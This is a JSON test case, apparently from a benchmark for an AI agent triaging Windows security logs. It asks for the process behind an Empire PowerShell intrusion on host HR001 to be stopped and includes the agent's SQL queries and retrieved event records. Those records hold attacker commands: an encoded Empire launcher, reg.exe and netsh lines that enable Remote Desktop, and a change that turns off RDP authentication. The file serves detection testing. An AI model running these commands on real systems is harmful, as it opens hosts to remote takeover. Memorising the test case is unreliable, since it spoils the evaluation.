@@ -1,0 +1,56 @@
+{
+  "case_id": "test-08:R_pos",
+  "profile": "Profile of window SDWIN-190518203650: 2668 events. Request: An Empire PowerShell on HR001 is enabling Remote Desktop and weakening its authentication. Stop process 5452 (powershell.exe) on HR001.shire.com. Target: {\"host\": \"HR001.shire.com\", \"pid\": 5452}.",
+  "queries": [
+    {
+      "sql": "SELECT * FROM process_create WHERE record_id IN (268, 271, 291, 295) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 268, \"ts\": \"2019-05-18T20:37:10.356000\", \"host\": \"HR001.shire.com\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\reg.exe\", \"command_line\": \"\\\"C:\\\\Windows\\\\system32\\\\reg.exe\\\" add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": null, \"pid\": 7792, \"ppid\": 5452, \"user\": \"nmartha\", \"integrity_level\": \"High\", \"hashes\": null}\n{\"record_id\": 271, \"ts\": \"2019-05-18T20:37:10.409000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\reg.exe\", \"command_line\": \"\\\"C:\\\\Windows\\\\system32\\\\reg.exe\\\" add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQ…[cut: 5458 chars]\", \"pid\": 7792, \"ppid\": 5452, \"user\": \"nmartha\", \"integrity_level\": \"High\", \"hashes\": \"SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC\"}\n{\"record_id\": 291, \"ts\": \"2019-05-18T20:37:10.582000\", \"host\": \"HR001.shire.com\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\netsh.exe\", \"command_line\": \"\\\"C:\\\\Windows\\\\system32\\\\netsh.exe\\\" firewall set service type = remotedesktop mod = enable\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": null, \"pid\": 4924, \"ppid\": 5452, \"user\": \"nmartha\", \"integrity_level\": \"High\", \"hashes\": null}\n{\"record_id\": 295, \"ts\": \"2019-05-18T20:37:10.671000\", \"host\": \"HR001.shire.com\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"command_line\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k NetworkService -s TermService\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"parent_command_line\": null, \"pid\": 7248, \"ppid\": 532, \"user\": \"hr001$\", \"integrity_level\": \"System\", \"hashes\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        268,
+        271,
+        291,
+        295
+      ]
+    },
+    {
+      "sql": "SELECT * FROM process_access WHERE record_id IN (272, 273, 277, 286) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 272, \"ts\": \"2019-05-18T20:37:10.409000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"source_pid\": 5452, \"target_image\": \"C:\\\\Windows\\\\system32\\\\reg.exe\", \"target_pid\": 7792, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a0ee4|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+47241|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+46196|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+1c2e3|C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319…[cut: 1236 chars]\", \"user\": null}\n{\"record_id\": 273, \"ts\": \"2019-05-18T20:37:10.409000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\Windows\\\\system32\\\\csrss.exe\", \"source_pid\": 448, \"target_image\": \"C:\\\\Windows\\\\system32\\\\reg.exe\", \"target_pid\": 7792, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9fb54|C:\\\\Windows\\\\system32\\\\basesrv.DLL+2fda|C:\\\\Windows\\\\SYSTEM32\\\\CSRSRV.dll+5e2a|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+6a27f\", \"user\": null}\n{\"record_id\": 277, \"ts\": \"2019-05-18T20:37:10.410000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\Windows\\\\system32\\\\conhost.exe\", \"source_pid\": 3816, \"target_image\": \"C:\\\\Windows\\\\system32\\\\reg.exe\", \"target_pid\": 7792, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9fb54|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+20d0e|C:\\\\Windows\\\\system32\\\\conhost.exe+f635|C:\\\\Windows\\\\system32\\\\conhost.exe+f52c|C:\\\\Windows\\\\system32\\\\conhost.exe+5258|C:\\\\Windows\\\\s…[cut: 299 chars]\", \"user\": null}\n{\"record_id\": 286, \"ts\": \"2019-05-18T20:37:10.472000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\Windows\\\\system32\\\\svchost.exe\", \"source_pid\": 748, \"target_image\": \"C:\\\\Windows\\\\system32\\\\svchost.exe\", \"target_pid\": 832, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9fb54|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+20d0e|c:\\\\windows\\\\system32\\\\rpcss.dll+b236|c:\\\\windows\\\\system32\\\\rpcss.dll+b1e8|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+77803|C:\\\\Windows\\\\Syste…[cut: 700 chars]\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        272,
+        273,
+        277,
+        286
+      ]
+    },
+    {
+      "sql": "SELECT * FROM registry WHERE record_id IN (284, 1176, 1177, 1178, 2071) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 284, \"ts\": \"2019-05-18T20:37:10.411000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 13, \"event_type\": \"SetValue\", \"image\": \"C:\\\\Windows\\\\system32\\\\reg.exe\", \"pid\": 7792, \"target_object\": \"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\fDenyTSConnections\", \"details\": \"DWORD (0x00000000)\", \"user\": null}\n{\"record_id\": 1176, \"ts\": \"2019-05-18T20:37:16\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 13, \"event_type\": \"SetValue\", \"image\": \"System\", \"pid\": 4, \"target_object\": \"HKLM\\\\System\\\\CurrentControlSet\\\\Enum\\\\UMB\\\\UMB\\\\1&841921d&0&TS_USB_HUB_Enumerator\\\\Properties\\\\{83da6326-97a6-4088-9453-a1923f573b29}\\\\0012\\\\(Default)\", \"details\": \"Binary Data\", \"user\": null}\n{\"record_id\": 1177, \"ts\": \"2019-05-18T20:37:16\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 12, \"event_type\": \"CreateKey\", \"image\": \"System\", \"pid\": 4, \"target_object\": \"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\DeviceClasses\\\\{65a9a6cf-64cd-480b-843e-32c86e1ba19f}\", \"details\": null, \"user\": null}\n{\"record_id\": 1178, \"ts\": \"2019-05-18T20:37:16\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 12, \"event_type\": \"CreateKey\", \"image\": \"System\", \"pid\": 4, \"target_object\": \"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\DeviceClasses\\\\{65a9a6cf-64cd-480b-843e-32c86e1ba19f}\", \"details\": null, \"user\": null}\n{\"record_id\": 2071, \"ts\": \"2019-05-18T20:37:22.147000\", \"host\": \"HR001.shire.com\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 13, \"event_type\": \"SetValue\", \"image\": \"C:\\\\Windows\\\\system32\\\\reg.exe\", \"pid\": 2016, \"target_object\": \"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\UserAuthentication\", \"details\": \"DWORD (0x00000000)\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 5,
+      "registered": [
+        284,
+        1176,
+        1177,
+        1178,
+        2071
+      ]
+    }
+  ],
+  "findings": "Records 268, 272, 284, 2071 look relevant to the request; deciding on the next action.",
+  "retrieved": [
+    268,
+    271,
+    272,
+    273,
+    277,
+    284,
+    286,
+    291,
+    295,
+    1176,
+    1177,
+    1178,
+    2071
+  ]
+}
